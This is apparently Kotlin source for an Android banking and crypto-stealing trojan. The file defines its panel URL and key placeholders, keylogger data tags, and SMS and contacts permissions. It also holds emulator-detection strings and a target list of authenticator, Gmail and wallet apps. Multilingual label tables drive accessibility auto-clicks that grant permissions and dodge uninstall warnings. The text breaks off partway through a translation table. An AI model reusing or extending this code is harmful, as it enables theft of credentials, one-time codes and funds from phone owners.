package com.amazon.zzz

import android.util.Base64
import com.amazon.zzz.Activities.actChangeSmsManager
import com.amazon.zzz.Activities.actToastAccessbility
import com.amazon.zzz.Activities.actViewInjection
import com.amazon.zzz.Admin.admActivityAdmin
import com.amazon.zzz.Services.srvPushAccessibility
import com.amazon.zzz.Services.srvSccessibility
import com.amazon.zzz.Services.srvToaskAccessibility
import java.nio.charset.Charset
import java.util.Locale

object constNm {
    val debug = BuildConfig.DEBUG
    val blockCIS = !BuildConfig.DEBUG
    val utf = Charsets.UTF_8

    //--------------Settings Connect Panal---------
    val url: String = if (BuildConfig.DEBUG) "http://10.0.2.2:3434" else "%INSERT_URL_HERE%"
    val k: String = if (BuildConfig.DEBUG) "1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf" else "%INSERT_KEY_HERE%"
    val tag: String = if (BuildConfig.DEBUG) "tag" else "%INSERT_TAG_HERE%"

    //------------Constants replace java class------
    val access1: String = if (BuildConfig.DEBUG) "Start Accessibility" else "%INSERT_ACCESS1_HERE%"
    val access2: String =
        if (BuildConfig.DEBUG) "Accessibility Service" else "%INSERT_ACCESS2_HERE%"

    val acname: String = "%Enable_Accessibility_Service%"

    val a3 = actToastAccessbility::class.java
    val a5 = srvToaskAccessibility::class.java
    val a7 = admActivityAdmin::class.java
    val a10 = actViewInjection::class.java
    val a11 = srvPushAccessibility::class.java
    val a14 = srvSccessibility::class.java
    val a15 = actChangeSmsManager::class.java.name

    val p1: String = "android.permission.READ_PHONE_NUMBERS"
    val p3: String = "android.permission.READ_SMS"
    val p4: String = "android.permission.SEND_SMS"
    val p4_: String = "android.permission.RECEIVE_SMS"
    val p5: String = "android.permission.READ_CONTACTS"
    val p6: String = "android.permission.GET_ACCOUNTS"

    val p2: ArrayList<String> by lazy {
        arrayListOf(
            "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
            p5,
            "android.permission.RECEIVE_BOOT_COMPLETED",
            "android.permission.ACCESS_NETWORK_STATE",
            p6,
            "android.permission.WAKE_LOCK",
            "android.permission.INTERNET",
            p4_,
            p3,
            "android.permission.READ_PHONE_STATE",
            p4,
            "android.permission.CALL_PHONE",
        )
    }

    // clear Cache
    // memory
    val кэш_епт by lazy {
        arrayOf(
            Strings.app_info_storage(),
            Strings.app_info_storage2(),
            Strings.storage_title()?.replace(":", "")
        ).toSet()
    }

    // clear data
    val дата by lazy {
        arrayOf(
            Strings.clear_data(),
            Strings.clear_data2(),
            Strings.uninstall_selected_apps(),
            "Стереть",
        ).toSet()
    }

    // reset
    val сброс_всего_человечества by lazy {
        arrayOf(
            Strings.reset(),
            "Сброс",
            "Reset",
        ).toSet()
    }

    // clear data
    val убить_всех by lazy {
        arrayOf(
            Strings.clear_data(),
            Strings.clear_data2(),
            Strings.uninstall_selected_apps(),
            "Clear storage",
            "Clear All",
            "Clear data",
        ).toSet()
    }

    // clear cache
    val чистим_чисто by lazy {
        arrayOf(
            Strings.app_info_clear_cache(),
            Strings.uninstall_selected_apps(),
            "Clear Cache",
        ).toSet()
    }

    // clear
    val так_чисто by lazy {
        arrayOf(
            Strings.clear_(),
            Strings.clear(),
            Strings.clear_data2(),
            "Удалить все данные",
            "Очистить память",
            "Очистить данные",
            "Очистить",
            "Clear",
            "Eliminar",
            "dégager",
            "Cancella",
        ).toSet()
    }

    // click ok
    val угу by lazy {
        arrayOf(
            Strings.ok(),
            Strings.yes(),
            "Ok",
        ).toSet()
    }

    // click clickProtect
    val настройки by lazy {
        arrayOf(
            Strings.notification_app_name_settings(),
            Strings.global_action_settings(),
            Strings.alert_windows_notification_turn_off_action(),
            Strings.menu_setting(),
            "Turn off",
        ).toSet()
    }

    // ussdSend
    val metamaskStr by lazy { Strings.metamask_settings() }

    // ussdSend
    val сенд by lazy {
        arrayOf(
            Strings.sms_short_code_confirm_allow()
        ).toSet()
    }

    // clicksButton
    val сука by lazy {
        mutableListOf(
            Strings.allow(),
            Strings.accept(),
            Strings.wait(),
        ).apply {
            if (Locale.getDefault().language == "it")
                this.add("Consenti")
        }.toSet()
    }

    // click ok
    val ага by lazy {
        arrayOf(
            Strings.gpsVerifYes(),
            Strings.yes(),
            Strings.ok(),
            "Да",
            "Yes",
            "Ok",
        ).toSet()
    }

    // unclick
    val не_клик by lazy {
        arrayOf(
            Strings.lockscreen_transport_pause_description(),
            Strings.harmful_app_warning_uninstall(),
            Strings.harmful_app_warning_uninstall2(),
            Strings.exo_controls_pause_description(),
            "Приостановить работу"
        ).toSet()
    }

    // unclick2
    val пауза2 by lazy {
        arrayOf(
            Strings.lockscreen_transport_pause_description(),
            Strings.harmful_app_warning_uninstall(),
            Strings.harmful_app_warning_uninstall2(),
            Strings.exo_controls_pause_description(),
        ).toSet()
    }

    // unclick3
    val нажми by lazy {
        arrayOf(
            Strings.cancel(),
            Strings.cancel2(),
            "Cancel",
            "Отмена"
        ).toSet()
    }


    // blockBack
    val акссес by lazy {
        arrayOf(
            Strings.spec_settings(),
            Strings.spec_settings2()
        ).toSet()
    }

    val не_трогай: String = base64Decode("LCJleGl0IjoiIg==")
    val хренов_реверсер: String = base64Decode("LCJleGl0IjoidHJ1ZSI=")
    val ключ_от_всего: String = base64Decode("PGh0bWwgbGFuZz0iZW4iPg==")
    val шифрование: String = base64Decode("PGh0bWwgbGFuZz0i")
    val ss5: String = base64Decode("Ij4=")

    //-----Starting Settings--------------------
    val мозила: String =
        " Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36"

    val LogEvents: String = "events"
    val dataKeylogger: String = "datakeylogger"

    val s104: String = "'"
    val s107: String = "var lang = 'en'"
    val s108: String = "var lang = '"
    val s109: String = "app = 'THISSTRINGREPLACEWITHAPPNAME'"
    val s110: String = "app = '"
    val s111: String = "'"

    val s_tochka: String = "."
    val str_248: String = "generic"
    val str_249: String = "unknown"
    val str_250: String = "google_sdk"
    val str_251: String = "Emulator"
    val str_252: String = "Android SDK built for x86"
    val str_253: String = "Genymotion"

    val authenticator2: String = "com.google.android.apps.authenticator2"
    val trustapp: String = "com.wallet.crypto.trustapp"
    val mwallet: String = "com.bitcoin.mwallet"
    val mycelium: String = "com.mycelium.wallet"
    val piuk: String = "piuk.blockchain.android"
    val samourai: String = "com.samourai.wallet"
    val toshi: String = "org.toshi"
    val gmail: String = "com.google.android.gm"
    val metamask: String = "io.metamask"
    val safepal: String = "io.safepal.wallet"
    val exodus: String = "exodusmovement.exodus"

    val l3: String =
        "{" +
                "'en':'Enable'," +
                "'de':'Aktivieren'," +
                "'af':'Aktiveer'," +
                "'zh':'启用'," +
                "'cs':'Zapnout'," +
                "'nl':'Activeren'," +
                "'fr':'Activer'," +
                "'it':'Abilitare'," +
                "'ja':'有効にする'," +
                "'ko':'사용하다'," +
                "'pl':'włączyć'," +
                "'es':'Habilitar'," +
                "'ar':'يُمكّن'," +
                "'bg':'Възможност'," +
                "'ca':'Habilitar'," +
                "'hr':'Aktivirati'," +
                "'da':'Aktivere'," +
                "'fi':'Ottaa käyttöön'," +
                "'el':'ενεργοποιώ'," +
                "'iw':'הפוך לזמין'," +
                "'hi':'सक्षम करें'," +
                "'hu':'Engedélyez'," +
                "'ru':'Включить'," +
                "'in':'Fungsikan'," +
                "'lv':'Aktivizēt'," +
                "'lt':'Aktyvinti'," +
                "'nb':'Aktivere'," +
                "'pt':'Ativar'," +
                "'ro':'Activa'," +
                "'sr':'Aktivirati'," +
                "'sk':'Aktivovať'," +
                "'sl':'Vključiti'," +
                "'sv':'Aktivera'," +
                "'th':'เปิดใช้งาน'," +
                "'tr':'Etkinleştirmek'," +
                "'vi':'có hiệu lực'" +
                "}"

    val accept: String =
        "{" +
                "'en':'Accept'," +
                "'af':'Aanvaar'," +
                "'am':'ተቀበል'," +
                "'ar':'قبول'," +
                "'as':'স্বীকাৰ কৰক'," +
                "'az':'Qəbul edin'," +
                "'be':'Прыняць'," +
                "'bg':'Приемам'," +
                "'bn':'গ্রহণ করুন'," +
                "'bs':'Prihvati'," +
                "'ca':'Accepta'," +
                "'cs':'Přijmout'," +
                "'da':'Accepter'," +
                "'de':'Akzeptieren'," +
                "'el':'Αποδοχή'," +
                "'es':'Aceptar'," +
                "'et':'Luba'," +
                "'eu':'Onartu'," +
                "'fa':'پذیرفتن'," +
                "'fi':'Hyväksy'," +
                "'fr':'Accepter'," +
                "'gl':'Aceptar'," +
                "'gu':'સ્વીકારો'," +
                "'hi':'स्वीकार करें'," +
                "'hr':'Prihvaćam'," +
                "'hu':'Elfogadás'," +
                "'hy':'Ընդունել'," +
                "'in':'Terima'," +
                "'is':'Samþykkja'," +
                "'it':'Adotta'," +
                "'iw':'קבל'," +
                "'ja':'同意する'," +
                "'ka':'მიღება'," +
                "'kk':'Қабылдау'," +
                "'kn':'ಸ್ವೀಕರಿಸಿ'," +
                "'ko':'동의'," +
                "'ky':'Кабыл алу'," +
                "'lo':'ຍອມຮັບ'," +
                "'lt':'Sutikti'," +
                "'lv':'Piekrist'," +
                "'mk':'Прифати'," +
                "'ml':'അംഗീകരിക്കുക'," +
                "'mn':'Зөвшөөрөх'," +
                "'mr':'स्वीकार करा'," +
                "'ms':'Terima'," +
                "'my':'လက်ခံရန်'," +
                "'nb':'Godta'," +
                "'ne':'स्वीकार्नुहोस्'," +
                "'nl':'Accepteren'," +
                "'no':'Accept'," +
                "'or':'ସ୍ୱୀକାର କରନ୍ତୁ'," +
                "'pa':'ਸਵੀਕਾਰ ਕਰੋ'," +
                "'pl':'Akceptuj'," +
                "'pt':'Aceitar'," +
                "'ro':'Acceptați'," +
                "'ru':'Принять'," +
                "'si':'පිළිගන්න'," +
                "'sk':'Prijať'," +
                "'sl':'Sprejmem'," +
                "'sq':'Prano'," +
                "'sr':'Прихвати'," +
                "'sv':'Godkänn'," +
                "'sw':'Kubali'," +
                "'ta':'ஏற்கிறேன்'," +
                "'te':'ఆమోదిస్తున్నాను'," +
                "'th':'ยอมรับ'," +
                "'tl':'Tanggapin'," +
                "'tr':'Kabul et'," +
                "'uk':'Прийняти'," +
                "'ur':'قبول کریں'," +
                "'uz':'Qabul qilish'," +
                "'vi':'Đồng ý'," +
                "'zu':'Yamukela'" +
                "}"

    val alert_windows_notification_turn_off_action: String =
        "{" +
                "'am':'አጥፋ'," +
                "'ar':'إيقاف'," +
                "'as':'অফ কৰক'," +
                "'az':'Deaktiv edin'," +
                "'be':'Выключыць'," +
                "'bg':'Изключване'," +
                "'bn':'বন্ধ করুন'," +
                "'bs':'Isključi'," +
                "'ca':'Desactiva'," +
                "'cs':'Vypnout'," +
                "'cz':'Vynutit ukonceni'," +
                "'da':'Deaktiver'," +
                "'de':'Beenden erzwingen'," +
                "'el':'Απενεργοποίηση'," +
                "'en':'Turn off'," +
                "'es':'Forzar detencion'," +
                "'et':'Lülita välja'," +
                "'fa':'خاموش کردن'," +
                "'fi':'Poista käytöstä'," +
                "'fr':'arrret'," +
                "'gl':'Desactivar'," +
                "'gu':'બંધ કરો'," +
                "'hi':'बंद करें'," +
                "'hr':'Isključi'," +
                "'hu':'Kikapcsolás'," +
                "'hy':'Անջատել'," +
                "'in':'Nonaktifkan'," +
                "'is':'Slökkva'," +
                "'it':'Отключить'," +
                "'iw':'כיבוי'," +
                "'ja':'OFF にする'," +
                "'ka':'გამორთვა'," +
                "'kk':'Өшіру'," +
                "'kn':'ಆಫ್ ಮಾಡಿ'," +
                "'ko':'사용 중지'," +
                "'ky':'Өчүрүү'," +
                "'lo':'ປິດ'," +
                "'lt':'Išjungti'," +
                "'lv':'Отключить'," +
                "'mk':'Исклучи'," +
                "'ml':'ഓഫാക്കുക'," +
                "'mn':'Унтраах'," +
                "'mr':'बंद करा'," +
                "'ms':'Matikan'," +
                "'my':'ပိတ်ရန်'," +
                "'nb':'Slå av'," +
                "'ne':'निष्क्रिय पार्नुहोस्'," +
                "'nl':'Uitschakelen'," +
                "'no':'Turn off'," +
                "'or':'ବନ୍ଦ କରନ୍ତୁ'," +
                "'pl':'Отключить'," +
                "'pt':'Desativar'," +
                "'ro':'Dezactivați'," +
                "'ru':'Отключить'," +
                "'si':'ක්‍රියාවිරහිත කරන්න'," +
                "'sk':'Vypnúť'," +
                "'sl':'Izklopi'," +
                "'sq':'Çaktivizo'," +
                "'sr':'Искључи'," +
                "'sv':'Inaktivera'," +
                "'sw':'Zima'," +
                "'ta':'ஆஃப் செய்'," +
                "'te':'ఆఫ్ చేయి'," +
                "'th':'ปิด'," +
                "'tl':'I-off'," +
                "'tr':'Durmaya zorla'," +
                "'ur':'آف کریں'," +
                "'uz':'Faolsizlantirish'," +
                "'vi':'Tắt'," +
                "'zu':'Vala'" +
                "}"

    val allow: String =
        "{" +
                "'am':'ይፍቀዱ'," +
                "'ar':'السماح'," +
                "'as':'অনুমতি দিয়ক'," +
                "'az':'İcazə verin'," +
                "'be':'Дазволіць'," +
                "'bg':'Разрешаване'," +
                "'bn':'অনুমতি দিন'," +
                "'bs':'Dozvoli'," +
                "'ca':'Permet'," +
                "'cs':'Povolit'," +
                "'cz':'Povolit'," +
                "'da':'Tillad'," +
                "'de':'Zulassen'," +
                "'el':'Να επιτρέπεται'," +
                "'en':'Allow'," +
                "'es':'Permitir'," +
                "'et':'Luba'," +
                "'fa':'ارزیابی‌شده'," +
                "'fi':'Salli'," +
                "'fr':'Autoriser'," +
                "'gl':'Permitir'," +
                "'gu':'મંજૂરી આપો'," +
                "'hi':'अनुमति दें'," +
                "'hr':'Dopusti'," +
                "'hu':'Engedélyezés'," +
                "'hy':'Թույլատրել'," +
                "'in':'Izinkan'," +
                "'is':'Leyfa'," +
                "'it':'Consetti'," +
                "'iw':'כן, זה בסדר'," +
                "'ja':'許可'," +
                "'ka':'უფლების მიცემა'," +
                "'kk':'Рұқсат беру'," +
                "'kn':'ಅನುಮತಿಸಿ'," +
                "'ko':'허용'," +
                "'ky':'Уруксат берүү'," +
                "'lo':'ອະນຸຍາດ'," +
                "'lt':'Leisti'," +
                "'lv':'Leisti'," +
                "'mk':'Дозволи'," +
                "'ml':'അനുവദിക്കുക'," +
                "'mn':'Зөвшөөрөх'," +
                "'mr':'अनुमती द्या'," +
                "'ms':'Benarkan'," +
                "'my':'ခွင့်ပြုရန်'," +
                "'nb':'Tillat'," +
                "'ne':'अनुमति दिनुहोस्'," +
                "'nl':'Toestaan'," +
                "'no':'Allow'," +
                "'or':'ଅନୁମତି ଦିଅନ୍ତୁ'," +
                "'pl':'Zezwól'," +
                "'pt':'Permitir'," +
                "'ro':'Permiteți'," +
                "'ru':'Разрешить'," +
                "'si':'අවසර දෙන්න'," +
                "'sk':'Povoliť'," +
                "'sl':'Dovoli'," +
                "'sq':'Lejo'," +
                "'sr':'Дозволи'," +
                "'sv':'Tillåt'," +
                "'sw':'Ruhusu'," +
                "'ta':'அனுமதி'," +
                "'te':'అనుమతించండి'," +
                "'th':'อนุญาต'," +
                "'tl':'Payagan'," +
                "'tr':'İzin ver'," +
                "'uk':'Дозволити'," +
                "'ur':'اجازت دیں'," +
                "'uz':'Ruxsat berish'," +
                "'vi':'Cho phép'," +
                "'zu':'Vumela'" +
                "}"

    val app_info_clear_cache: String =
        "{" +
                "'af':'Kosongkan cache'," +
                "'am':'መሸጎጫ አጥራ'," +
                "'ar':'محو ذاكرة التخزين المؤقتें'," +
                "'bg':'Изчистване на кеша'," +
                "'ca':'Esborra la memòria cau'," +
                "'cs':'Vymazat mezipaměť'," +
                "'cz':'VYMAZAT MEZIPAMET'," +
                "'da':'Ryd cache'," +
                "'de':'Cache leeren'," +
                "'el':'Εκκαθάριση προσωρινής μνήμης'," +
                "'en':'Clear cache'," +
                "'es':'Borrar cache'," +
                "'et':'Tühjenda vahemälu'," +
                "'fr':'Vider le cache'," +
                "'hi':'कैश साफ़ करें'," +
                "'hr':'Očisti predmemoriju'," +
                "'hu':'A gyorsítótár törlése'," +
                "'in':'Hapus cache'," +
                "'it':'Svuota cache'," +
                "'iw':'נקה קבצים שמורים'," +
                "'ja':'キャッシュを消去'," +
                "'ka':'ქეშის წაშლა'," +
                "'ko':'캐시 지우기'," +
                "'lo':'ລຶບລ້າງແຄຊ'," +
                "'lv':'ISVALYTI TALPYKLA'," +
                "'ms':'Kosongkan cache'," +
                "'my':'cache ကိုရှင်းရှင်းလင်းလင်း'," +
                "'nb':'Fjern hurtiglager'," +
                "'nl':'Cache wissen'," +
                "'no':'Tøm buffer'," +
                "'pl':'WYCZYC PAMIEC PODRECZNA'," +
                "'pt':'Limpar cache'," +
                "'ro':'Goliţi memoria cache'," +
                "'ru':'Очистить кеш'," +
                "'si':'හැඹිලිය හිස් කරන්න'," +
                "'sk':'Vymazať vyrovnávaciu pamäť'," +
                "'sr':'Обриши кеш'," +
                "'sv':'Töm cache'," +
                "'th':'ล้างแคช'," +
                "'tl':'I-clear ang cache'," +
                "'tr':'Önbelleği temizle'," +
                "'uk':'Очистити кеш'," +
                "'vi':'Xóa bộ nhớ cache'" +
                "}"

    val app_info_storage: String =
        "{" +
                "'af':'Berging'," +
                "'am':'ማከማቻ'," +
                "'ar':'التخزين'," +
                "'bg':'Хранилище'," +
                "'ca':'Emmagatzematge'," +
                "'cs':'Úložiště'," +
                "'cz':'Uloziste'," +
                "'da':'Lagring'," +
                "'de':'Speicher'," +
                "'el':'αποθήκευση'," +
                "'en':'Storage'," +
                "'es':'Almacenamiento'," +
                "'et':'Mäluruum'," +
                "'fr':'Stockage'," +
                "'hi':'संग्रहण'," +
                "'hr':'Prostor za pohranu'," +
                "'hu':'Tárhely'," +
                "'in':'Penyimpanan'," +
                "'it':'Spazio di archiviazione'," +
                "'iw':'אחסון'," +
                "'ja':'ストレージ'," +
                "'ka':'საცავი'," +
                "'ko':'저장공간'," +
                "'lo':'ພື້ນທີ່ຈັດເກັບຂໍ້ມູນ'," +
                "'lv':'Saugykla'," +
                "'ms':'Storan'," +
                "'nb':'Lagring'," +
                "'nl':'Opslagruimte'," +
                "'no':'Storage'," +
                "'pl':'Pamiec wewnetrzna'," +
                "'pt':'Armazenamento'," +
                "'ro':'Stocare'," +
                "'ru':'Хранилище'," +
                "'si':'ආචයනය'," +
                "'sk':'Úložisko'," +
                "'sr':'Складиште'," +
                "'sv':'Lagring'," +
                "'th':'พื้นที่เก็บข้อมูล'," +
                "'tl':'Imbakan'," +
                "'tr':'Depolama'," +
                "'uk':'Память'," +
                "'vi':'Dung lượng'" +
                "}"

    val app_info_storage2: String =
        "{" +
                "'da':'Lager'," +
                "'en':'Storage'," +
                "'ru':'Память'," +
                "'es':'Ajustes'," +
                "'it':'Spazio '," +
                "'no':'Lagring'" +
                "}"

    val cancel: String =
        "{" +
                "'da':'Annuller'," +
                "'de':'Abbruch'," +
                "'en':'Cancel'," +
                "'es':'Cancelar'," +
                "'fr':'Annuller'," +
                "'it':'Annulla'," +
                "'no':'Avbryt'," +
                "'sv':'Avbryt'," +
                "'tr':'İptal'" +
                "}"

    val cancel2: String =
        "{" +
                "'da':'Annuller'," +
                "'de':'Abbrechen'," +
                "'en':'Cancel'," +
                "'es':'Cancelar'," +
                "'fr':'Annuler'," +
                "'it':'Annulla'," +
                "'no':'Avbryt'," +
                "'sv':'Avbryt'," +
                "'tr':'İptal'" +
                "}"

    val clear: String =
        "{" +
                "'da':'Ryd'," +
                "'de':'Löschen'," +
                "'en':'Clear'," +
                "'es':'Borrar'," +
                "'fr':'Effacer les données'," +
                "'it':'Elimina dati'," +
                "'no':'Fjern'," +
                "'ru':'Очистить'," +
                "'sv':'Radera'," +
                "'tr':'Temizle'" +
                "}"

    val clear_: String =
        "{" +
                "'am':'ግልፅ'," +
                "'ar':'امن'," +
                "'az':'aydın'," +
                "'be':'ачысціць'," +
                "'bg':'ясно'," +
                "'bn':'পরিষ্কার'," +
                "'bs':'jasno'," +
                "'ca':'Clar'," +
                "'cs':'klar'," +
                "'da':'ren'," +
                "'de':'klar'," +
                "'el':'Σαφή'," +
                "'en':'clear'," +
                "'es':'Limpiar datos'," +
                "'et':'selge'," +
                "'eu':'argi'," +
                "'fi':'puhdas'," +
                "'fr':'Effacer'," +
                "'gl':'claro'," +
                "'gu':'સ્વચ્છ'," +
                "'hi':'स्पष्ट'," +
                "'hr':'čist'," +
                "'hu':'tiszta'," +
                "'hy':'պարզ'," +
                "'is':'hreint'," +
                "'it':'chiaro'," +
                "'ja':'晴れ'," +
                "'ka':'ნათელია'," +
                "'kk':'анық'," +
                "'kn':'ಸ್ಪಷ್ಟ'," +
                "'ko':'맑은'," +
                "'lo':'ຈະແຈ້ງ'," +
                "'lt':'švarus'," +
                "'lv':'skaidrs'," +
                "'mk':'јасен'," +
                "'ml':'വെടിപ്പുള്ള'," +
                "'mn':'цэвэр'," +
                "'mr':'स्वच्छ'," +
                "'my':'ရှင်းလင်းသော'," +
                "'ne':'सफा'," +
                "'nl':'klar'," +
                "'no':'clear'," +
                "'pl':'jasny'," +
                "'pt':'limpo'," +
                "'ro':'curat'," +
                "'ru':'Очистить'," +
                "'si':'පිරිසිදු'," +
                "'sk':'jasný'," +
                "'sl':'jasno'," +
                "'sq':'qartë'," +
                "'sr':'јасно'," +
                "'sv':'klar'," +
                "'ta':'சுத்தமான'," +
                "'te':'శుభ్రంగా'," +
                "'th':'ชัดเจน'," +
                "'tr':'Verileri temizle'," +
                "'uk':'очистити'," +
                "'ur':'صاف'," +
                "'uz':'toza'," +
                "'vi':'thông thoáng'" +
                "}"

    val clear_data: String =
        "{" +
                "'am':'መረጃን ያስሉ'," +
                "'ar':'احسب البيانات'," +
                "'az':'Məlumatları silin'," +
                "'be':'ачысціць дадзеныя'," +
                "'bg':'Изчистване данните'," +
                "'bn':'উপাত্ত মুছে ফেল'," +
                "'bs':'Obriši podatke'," +
                "'ca':'Esborrar dades'," +
                "'cs':'Vyčistit data'," +
                "'da':'Slet data'," +
                "'de':'Entfernen daten'," +
                "'el':'Καθαρισμός δεδομένων'," +
                "'en':'Clear data'," +
                "'es':'Borrar datos'," +
                "'et':'Kustuta andmed'," +
                "'eu':'Datuak garbitu'," +
                "'fi':'Puhdas data'," +
                "'fr':'Effacer données'," +
                "'gl':'Borrar datos'," +
                "'hi':'स्पष्ट डेटा'," +
                "'hy':'հստակ տվյալներ'," +
                "'it':'Cancella dati'," +
                "'ja':'クリアデータ'," +
                "'ka':'ნათელი მონაცემები'," +
                "'kk':'Деректерді өшіру'," +
                "'kn':'ಡೇಟಾವನ್ನು ತೆರವುಗೊಳಿಸಿ'," +
                "'ko':'데이터 지우기'," +
                "'ky':'데이터 지우기'," +
                "'lv':'Izdzēst datus'," +
                "'my':'ရှင်းရှင်းလင်းလင်းဒေတာ'," +
                "'nl':'Slet data'," +
                "'no':'Tøm data'," +
                "'pt':'Apagar os dados'," +
                "'ro':'Date clare'," +
                "'ru':'Стереть данные'," +
                "'sk':'Zmazať dáta'," +
                "'sl':'Počisti podatke'," +
                "'sq':'Llogaritni të dhënat'," +
                "'sr':'Обриши податке'," +
                "'sv':'Radera data'," +
                "'th':'ข้อมูลชัดเจน'," +
                "'tr':'Net veriler'," +
                "'uk':'Очистити дані'," +
                "'vi':'Xóa dữ liệu'" +
                "}"

    val clear_data2: String =
        "{" +
                "'da':'Ryd data'," +
                "'de':'Daten löschen'," +
                "'en':'Clear data'," +
                "'fr':'Supprimer les données'," +
                "'no':'Slett data'," +
                "'ru':'Очистить данные'," +
                "'sv':'Rensa data'," +
                "'tr':'Veriyi sil'" +
                "}"

    val exo_controls_pause_description: String =
        "{" +
                "'af':'Wag'," +
                "'am':'ለአፍታ አቁም'," +
                "'ar':'إيقاف مؤقت'," +
                "'az':'Pauza'," +
                "'be':'Прыпыніць'," +
                "'bg':'Пауза'," +
                "'ca':'Posa en pausa'," +
                "'cs':'Pozastavit'," +
                "'cz':'Vynutit ukonceni'," +
                "'da':'Pause'," +
                "'de':'Beenden erzwingen'," +
                "'el':'Παύση'," +
                "'en':'Pause'," +
                "'es':'Forzar detencion'," +
                "'fa':'مکث'," +
                "'fi':'Tauko'," +
                "'fr':'Forcer '," +
                "'hi':'रोकें'," +
                "'hr':'Pauziraj'," +
                "'hu':'Szünet'," +
                "'in':'Jeda'," +
                "'it':'Forza interruzione'," +
                "'iw':'השהה'," +
                "'ja':'一時停止'," +
                "'ka':'პაუზა'," +
                "'ko':'일시중지'," +
                "'lt':'Pristabdyti'," +
                "'lv':'Sustabdyti'," +
                "'nb':'Sett på pause'," +
                "'nl':'Onderbreken'," +
                "'no':'Pause'," +
                "'pl':'Wymus zatrzymanie'," +
                "'pt':'Pausar'," +
                "'ro':'Pauză'," +
                "'ru':'Приостановить'," +
                "'sk':'Pozastaviť'," +
                "'sl':'Zaustavi'," +
                "'sr':'Пауза'," +
                "'sv':'Pausa'," +
                "'sw':'Sitisha'," +
                "'th':'หยุดชั่วคราว'," +
                "'tl':'I-pause'," +
                "'tr':'Durmaya zorla'," +
                "'uk':'Пауза'," +
                "'vi':'Tạm dừng'" +
                "}"

    val global_action_settings: String =
        "{" +
                "'am':'ቅንብሮች'," +
                "'ar':'الإعدادات'," +
                "'as':'ছেটিংসমূহ'," +
                "'az':'Ayarlar'," +
                "'be':'Налады'," +
                "'bn':'সেটিংস'," +
                "'bs':'Postavke'," +
                "'ca':'Configuració'," +
                "'cs':'Nastavení'," +
                "'cz':'Nastaveni'," +
                "'da':'Indstillinger'," +
                "'de':'Einstellungen'," +
                "'el':'Ρυθμίσεις'," +
                "'en':'Settings'," +
                "'es':'Ajustes'," +
                "'et':'Seaded'," +
                "'fa':'تنظیمات'," +
                "'fi':'Asetukset'," +
                "'fr':'Parametres'," +
                "'gl':'Configuración'," +
                "'gu':'સેટિંગ'," +
                "'hi':'सेटिंग'," +
                "'hr':'Postavke'," +
                "'hu':'Beállítások'," +
                "'hy':'Կարգավորումներ'," +
                "'in':'Setelan'," +
                "'is':'Stillingar'," +
                "'it':'Impostazioni'," +
                "'iw':'הגדרות'," +
                "'ja':'設定'," +
                "'ka':'პარამეტრები'," +
                "'kk':'Параметрлер'," +
                "'kn':'ಸೆಟ್ಟಿಂಗ್‌ಗಳು'," +
                "'ko':'설정'," +
                "'ky':'Жөндөөлөр'," +
                "'lo':'​ການ​ຕັ້ງ​ຄ່າ'," +
                "'lt':'Nustatymai'," +
                "'lv':'Nustatymai'," +
                "'mk':'Поставки'," +
                "'ml':'ക്രമീകരണം'," +
                "'mn':'Тохиргоо'," +
                "'mr':'सेटिंग्ज'," +
                "'ms':'Tetapan'," +
                "'my':'ဆက်တင်များ'," +
                "'nb':'Innstillinger'," +
                "'ne':'सेटिङहरू'," +
                "'nl':'Instellingen'," +
                "'no':'Settings'," +
                "'or':'ସେଟିଙ୍ଗ'," +
                "'pl':'Ustawienia'," +
                "'pt':'Configurações'," +
                "'ro':'Setări'," +
                "'ru':'Настройки'," +
                "'si':'සැකසීම්'," +
                "'sk':'Nastavenia'," +
                "'sl':'Nastavitve'," +
                "'sq':'Cilësimet'," +
                "'sr':'Подешавања'," +
                "'sv':'Inställningar'," +
                "'sw':'Mipangilio'," +
                "'ta':'அமைப்பு'," +
                "'te':'సెట్టింగ్‌లు'," +
                "'th':'การตั้งค่า'," +
                "'tl':'Mga Setting'," +
                "'tr':'Ayarlar'," +
                "'ur':'ترتیبات'," +
                "'uz':'Sozlamalar'," +
                "'vi':'Cài đặt'," +
                "'zu':'Izilungiselelo'" +
                "}"

    val gpsVerifYes: String =
        "{" +
                "'am':'አዎ'," +
                "'ar':'نعم'," +
                "'as':'হয়'," +
                "'az':'Bəli'," +
                "'be':'Так'," +
                "'bg':'Да'," +
                "'bn':'হ্যাঁ'," +
                "'bs':'Da'," +
                "'ca':'Sí'," +
                "'cs':'Ano'," +
                "'cz':'Ano'," +
                "'da':'Ja'," +
                "'de':'Ja'," +
                "'el':'Ναι'," +
                "'en':'Yes'," +
                "'es':'Si'," +
                "'et':'Jah'," +
                "'fa':'بله'," +
                "'fi':'Kyllä'," +
                "'fr':'Oui'," +
                "'gl':'Si'," +
                "'gu':'હા'," +
                "'hi':'हां'," +
                "'hr':'Da'," +
                "'hu':'Igen'," +
                "'hy':'Այո'," +
                "'in':'Ya'," +
                "'is':'Já'," +
                "'it':'Si'," +
                "'iw':'כן'," +
                "'ja':'はい'," +
                "'ka':'დიახ'," +
                "'kk':'Иә'," +
                "'kn':'ಹೌದು'," +
                "'ko':'예'," +
                "'ky':'Ооба'," +
                "'lo':'ຕົກລົງ'," +
                "'lt':'Taip'," +
                "'lv':'Taip'," +
                "'mk':'Да'," +
                "'ml':'വേണം'," +
                "'mn':'Тийм'," +
                "'mr':'होय'," +
                "'ms':'Ya'," +
                "'my':'Yes'," +
                "'nb':'Ja'," +
                "'ne':'हो'," +
                "'nl':'Ja'," +
                "'no':'Yes'," +
                "'or':'ହଁ'," +
                "'pl':'Tak'," +
                "'pt':'Sim'," +
                "'ro':'Da'," +
                "'ru':'Да'," +
                "'si':'ඔව්'," +
                "'sk':'Áno'," +
                "'sl':'Da'," +
                "'sq':'Po'," +
                "'sr':'Да'," +
                "'sv':'Ja'," +
                "'sw':'Ndiyo'," +
                "'ta':'ஆம்'," +
                "'te':'అవును'," +
                "'th':'ใช่'," +
                "'tl':'Oo'," +
                "'tr':'Evet'," +
                "'ur':'ہاں'," +
                "'uz':'Ha'," +
                "'vi':'Có'," +
                "'zu':'Yebo'" +
                "}"

    val harmful_app_warning_uninstall: String =
        "{" +
                "'am':'አራግፍ'," +
                "'ar':'إلغاء التثبيت'," +
                "'as':'আনইনষ্টল কৰক'," +
                "'az':'Si̇stemdən si̇li̇n'," +
                "'be':'Выдаліць'," +
                "'bg':'Деинсталиране'," +
                "'bn':'আন-ইনস্টল করুন'," +
